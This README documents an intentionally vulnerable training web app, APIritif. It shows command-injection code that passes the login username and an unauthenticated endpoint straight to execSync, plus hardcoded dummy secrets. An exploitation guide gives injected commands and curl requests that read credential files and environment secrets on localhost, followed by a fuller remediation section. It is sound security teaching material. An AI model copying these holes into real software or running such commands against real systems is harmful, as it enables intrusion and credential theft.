# APIritif - Vulnerable Web Application for Educational Purposes

## 📋 Table of Contents
- [Overview](#overview)
- [Project Description](#project-description)
- [Architecture](#architecture)
- [Security Vulnerabilities](#security-vulnerabilities)
- [How to Run](#how-to-run)
- [Exploitation Guide](#exploitation-guide)
- [Remediation Guide](#remediation-guide)
- [References](#references)

---

## 🎯 Overview

**APIritif** is an intentionally vulnerable web application designed for educational cybersecurity training. This project demonstrates real-world security flaws through hands-on exploitation and teaches students how to identify, exploit, and remediate common web application vulnerabilities.

### Purpose
- Learn security concepts through practical application
- Understand attack vectors and their consequences
- Develop secure coding practices
- Build a foundation for secure software development

---

## 📝 Project Description

### The Challenge
Create a vulnerable web application that teaches students:
1. **How vulnerabilities work** in real-world scenarios
2. **How to exploit them** safely in a controlled environment
3. **How to fix them** using secure coding practices

### What Makes APIritif Special
- **Intentional vulnerabilities** - Not accidental, but carefully designed for learning
- **Progressive complexity** - From simple to advanced exploitation
- **Containerized environment** - Isolated and safe for testing
- **Real-world scenarios** - Based on actual attack patterns

---

## 🏗️ Architecture

### Technology Stack
```
Frontend:
├── React 18
├── React Router
├── Vite
└── Docker Container (port 3000)

Backend:
├── Node.js / Express
├── Vulnerable APIs
└── Docker Container (port 5000)

Database:
├── PostgreSQL
└── Docker Container (port 5432)
```

### Deployment
```bash
docker-compose up --build
```

**Access Points:**
- Frontend: `http://localhost:3000`
- Backend API: `http://localhost:5000`
- Database: `localhost:5432`

---

## 🔓 Security Vulnerabilities

### 1. Command Injection (RCE - Remote Code Execution)

#### Vulnerability Type
**CWE-78**: Improper Neutralization of Special Elements used in an OS Command

#### Location
- **File:** `backend/server.js`
- **Endpoint:** `POST /api/login`
- **Vulnerable Code:**
```javascript
app.post('/api/login', (req, res) => {
  const { username, password } = req.body;
  
  // ❌ VULNERABLE - Direct command execution
  try {
    const result = execSync(username, { encoding: 'utf-8' });
    res.json({ success: false, output: result });
  } catch (error) {
    res.json({ success: false, error: error.message });
  }
});
```

#### Why It's Vulnerable
- **No input validation** - User input is directly passed to `execSync()`
- **No sanitization** - Special shell characters are not escaped
- **Direct OS command execution** - Attacker can run arbitrary system commands
- **No allowlist/denylist** - Any command is accepted

#### Risk Level
🔴 **CRITICAL** - Complete system compromise possible

#### Impact
- Read sensitive files (`/app/config/database.env`, `/app/config/aws-keys.txt`)
- Execute arbitrary commands
- Access container filesystem
- Potential for lateral movement
- Data exfiltration

---

### 2. Hardcoded Secrets

#### Vulnerability Type
**CWE-798**: Use of Hard-Coded Credentials

#### Location
- **File:** `backend/server.js`
- **Vulnerable Code:**
```javascript
fs.writeFileSync(path.join(configDir, 'database.env'), 
  'DATABASE_URL=postgres://admin:SuperSecret123@db:5432/weather\n...
  'API_KEY=sk-1234567890abcdef\n...');

fs.writeFileSync(path.join(configDir, 'aws-keys.txt'), 
  'AWS_ACCESS_KEY=AKIA1234567890ABCDEF\n...');
```

#### Why It's Vulnerable
- **Secrets in source code** - Credentials committed to repository
- **Predictable locations** - Known config directories
- **No encryption** - Plaintext storage
- **Accessible to attackers** - Via RCE vulnerability

#### Risk Level
🔴 **CRITICAL** - Direct access to backend systems

#### Impact
- Database compromise
- Third-party API access (Stripe, Twilio, AWS)
- Privilege escalation
- Account takeover

---

### 3. Insufficient Input Validation

#### Vulnerability Type
**CWE-20**: Improper Input Validation

#### Location
- **File:** `backend/server.js`
- **Endpoint:** `POST /api/execute`
- **Vulnerable Code:**
```javascript
app.post('/api/execute', (req, res) => {
  const { command } = req.body;
  
  try {
    const result = execSync(command, { encoding: 'utf-8' });
    res.json({ output: result });
  } catch (error) {
    res.json({ error: error.message });
  }
});
```

#### Why It's Vulnerable
- **No validation** - Command parameter accepted as-is
- **No authentication** - Endpoint accessible without authentication
- **No rate limiting** - Unlimited command execution
- **No logging** - No audit trail of commands executed

#### Risk Level
🟠 **HIGH** - Unauthenticated RCE

---

## 🔍 Exploitation Guide

### Prerequisites
- Application running via `docker-compose up --build`
- Access to `http://localhost:3000`
- Frontend application loaded

### Method 1: Login Form Injection

#### Step 1: Access Login Page
Navigate to `http://localhost:3000`

#### Step 2: Exploit Command Injection
In the **Username** field, enter any of these commands:

**Read Database Credentials:**
```bash
cat /app/config/database.env
```

**Expected Output:**
```
DATABASE_URL=postgres://admin:SuperSecret123@db:5432/weather
API_KEY=sk-1234567890abcdef
ADMIN_PASSWORD=MyP@ssw0rd123
```

**Read AWS Keys:**
```bash
cat /app/config/aws-keys.txt
```

**Expected Output:**
```
AWS_ACCESS_KEY=AKIA1234567890ABCDEF
AWS_SECRET_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
```

**Check Container User:**
```bash
whoami
```

**Expected Output:**
```
root
```

**List Files:**
```bash
ls -la /app
```

#### Step 3: Observe Results
- Injected command output displays in error message
- User remains on login page
- No authentication required
- Command executes with `root` privileges

#### Step 4: Valid Credentials (for comparison)
- **Username:** `admin`
- **Password:** `password`
- Result: Successful login to application

### Method 2: Direct API Exploitation (via cURL)

```bash
# Read database config
curl -X POST http://localhost:5000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"cat /app/config/database.env","password":"anything"}'

# Read AWS keys
curl -X POST http://localhost:5000/api/execute \
  -H "Content-Type: application/json" \
  -d '{"command":"cat /app/config/aws-keys.txt"}'

# List sensitive directories
curl -X POST http://localhost:5000/api/execute \
  -H "Content-Type: application/json" \
  -d '{"command":"find /app/config -type f"}'
```

### Method 3: Advanced Exploitation

**Command Chaining:**
```bash
cat /app/config/database.env && cat /app/config/aws-keys.txt
```

**Environment Variables:**
```bash
env | grep -E "DATABASE|API|SECRET|KEY"
```

**Process Inspection:**
```bash
ps aux | grep node
```

---

## 🛡️ Remediation Guide

### Remediation 1: Input Validation & Sanitization

#### ❌ Vulnerable Code
```javascript
app.post('/api/login', (req, res) => {
  const { username, password } = req.body;
  const result = execSync(username, { encoding: 'utf-8' });
});
```

#### ✅ Secure Implementation

```javascript
const validator = require('validator');

app.post('/api/login', (req, res) => {
  const { username, password } = req.body;

  // Input validation
  if (!username || !password) {
    return res.status(400).json({ error: 'Missing credentials' });
  }

  if (username.length > 50 || password.length > 50) {
    return res.status(400).json({ error: 'Invalid input length' });
  }

  // Whitelist validation - only alphanumeric and underscore
  if (!/^[a-zA-Z0-9_]+$/.test(username)) {
    return res.status(400).json({ error: 'Invalid username format' });
  }

  // Use parameterized queries instead of command execution
  const validUsers = {
    'admin': 'hashed_password_hash'
  };

  if (validUsers[username] === hashPassword(password)) {
    res.json({ success: true, token: generateToken() });
  } else {
    res.status(401).json({ success: false, error: 'Invalid credentials' });
  }
});
```

### Remediation 2: Avoid Command Execution

#### ❌ Vulnerable Pattern
```javascript
const result = execSync(userInput);
```

#### ✅ Secure Alternatives

**Option 1: Use Built-in Libraries**
```javascript
// Instead of execSync for file reading
const fs = require('fs');
const fileContent = fs.readFileSync('/path/to/file', 'utf-8');
```

**Option 2: Implement Whitelist**
```javascript
const ALLOWED_COMMANDS = {
  'status': 'systemctl status app',
  'logs': 'tail -n 100 app.log',
  'restart': 'systemctl restart app'
};

app.post('/api/admin/command', authenticateAdmin, (req, res) => {
  const { action } = req.body;

  if (!ALLOWED_COMMANDS[action]) {
    return res.status(400).json({ error: 'Invalid action' });
  }

  // Execute only whitelisted command
  const result = execSync(ALLOWED_COMMANDS[action]);
  res.json({ output: result });
});
```

**Option 3: Use Safer Alternatives**
```javascript
// Use child_process.execFile instead of execSync
const { execFile } = require('child_process');

execFile('cat', ['/path/to/file'], (error, stdout, stderr) => {
  if (error) throw error;
  res.json({ output: stdout });
});
```

### Remediation 3: Secrets Management

#### ❌ Vulnerable Code
```javascript
fs.writeFileSync('config.env', 
  'DATABASE_URL=postgres://admin:SuperSecret123@db:5432/weather');
```

#### ✅ Secure Implementation

**Option 1: Environment Variables**
```javascript
// .env file (NOT committed to repository)
DATABASE_URL=postgres://admin:password@db:5432/weather
API_KEY=sk-1234567890abcdef

// server.js
require('dotenv').config();
const dbUrl = process.env.DATABASE_URL;
const apiKey = process.env.API_KEY;
```

**Option 2: Docker Secrets (Production)**
```yaml
version: '3.8'
services:
  backend:
    environment:
      - DATABASE_URL=/run/secrets/db_url
    secrets:
      - db_url

secrets:
  db_url:
    external: true
```

**Option 3: Secret Management Service**
```javascript
const AWS = require('aws-sdk');
const secretsManager = new AWS.SecretsManager();

const getSecret = async (secretName) => {
  const data = await secretsManager
    .getSecretValue({ SecretId: secretName })
    .promise();
  return JSON.parse(data.SecretString);
};

const dbConfig = await getSecret('prod/database');
```

### Remediation 4: Authentication & Authorization

#### ❌ No Protection
```javascript
app.post('/api/execute', (req, res) => {
  // Anyone can execute commands
});
```

#### ✅ Secure Implementation
```javascript
const jwt = require('jsonwebtoken');

const authenticateToken = (req, res, next) => {
  const authHeader = req.headers['authorization'];
  const token = authHeader && authHeader.split(' ')[1];

  if (!token) return res.sendStatus(401);

  jwt.verify(token, process.env.JWT_SECRET, (err, user) => {
    if (err) return res.sendStatus(403);
    req.user = user;
    next();
  });
};

const authorizeAdmin = (req, res, next) => {
  if (req.user.role !== 'admin') {
    return res.status(403).json({ error: 'Admin access required' });
  }
  next();
};

app.post('/api/execute', authenticateToken, authorizeAdmin, (req, res) => {
  // Only authenticated admins can reach here
});
```

### Remediation 5: Logging & Monitoring

#### ✅ Implementation
```javascript
const logger = require('winston');

const requestLogger = (req, res, next) => {
  logger.info({
    timestamp: new Date(),
    method: req.method,
    path: req.path,
    user: req.user?.id,
    ip: req.ip
  });
  next();
};

app.post('/api/login', requestLogger, (req, res) => {
  logger.warn({
    event: 'login_attempt',
    username: req.body.username,
    success: false,
    reason: 'Invalid format'
  });
});
```

---

## 📚 Best Practices Summary

| Vulnerability | Prevention Method |
|---|---|
| Command Injection | Avoid `exec*()`, use libraries, whitelist commands |
| Hardcoded Secrets | Use environment variables, secret managers |
| Input Validation | Whitelist validation, length limits, type checking |
| Missing Auth | JWT, OAuth2, session management |
| No Logging | Structured logging, audit trails |

---

## 🚀 How to Run

### Prerequisites
- Docker & Docker Compose installed
- Port 3000, 5000, 5432 available

### Quick Start
```bash
cd APIritif/Defi_AEDI/myapp
docker-compose up --build
```

### Access Application
- **Frontend:** http://localhost:3000
- **Backend API:** http://localhost:5000
- **Login:** admin / password

### Stop Application
```bash
docker-compose down
```

---

## 📖 References

### OWASP
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)
- [CWE-798: Hardcoded Credentials](https://cwe.mitre.org/data/definitions/798.html)

### Security Resources
- [Node.js Security Best Practices](https://nodejs.org/en/docs/guides/security/)
- [OWASP Input Validation Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html)
- [Secrets Management Guide](https://www.vaultproject.io/)

### Tools
- `npm audit` - Dependency vulnerability scanner
- `snyk` - Application security testing
- `burp suite` - Web application security testing






